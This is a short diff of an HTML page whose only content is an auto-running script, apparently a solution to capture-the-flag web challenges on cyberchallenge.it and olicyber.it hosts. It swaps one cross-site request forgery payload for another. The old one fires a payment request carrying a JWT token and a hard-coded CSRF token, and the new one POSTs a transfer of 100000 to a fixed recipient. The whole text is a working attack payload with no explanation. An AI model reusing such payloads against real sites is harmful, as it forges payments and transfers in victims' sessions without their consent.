@@ -1,9 +1,6 @@
 <script>
-fetch("http://payflag-2.challs.cyberchallenge.it/pay?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0b2tlbiI6ImNlYmUzYTNlYTUzMjNjMDA5NGUxNmIzMjI4NzQxNTA1IiwicHJpY2UiOjEwMH0.a3ZlJn1pCiBMiACwfQR5YFxa8JDpakeNV-1QNPEGyhQ&redirect_url=http://flagify-2.challs.cyberchallenge.it/callback", {
+fetch("https://easyshop.challs.olicyber.it/send", {
   method: "POST",
-  body: JSON.stringify({
-    accepted: "ok",
-    csfr: "2c2a13bc260dd30930c73b998cb8c585"
-  }),
+  body: new URLSearchParams({ to: "d37a0dd4f9e3f479f6b46f75363487e1098c8e75b7bb65339e7cc965be58025f", amount: 100000 }),
 });
 </script>
